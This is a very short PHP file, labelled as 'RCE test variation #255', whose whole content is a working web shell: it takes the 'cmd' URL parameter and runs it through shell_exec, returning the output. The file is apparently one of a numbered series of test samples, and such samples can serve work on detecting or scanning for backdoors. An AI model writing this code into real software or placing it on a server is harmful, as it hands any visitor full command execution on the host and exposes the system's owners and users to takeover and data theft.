<?php
// RCE test variation #255
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>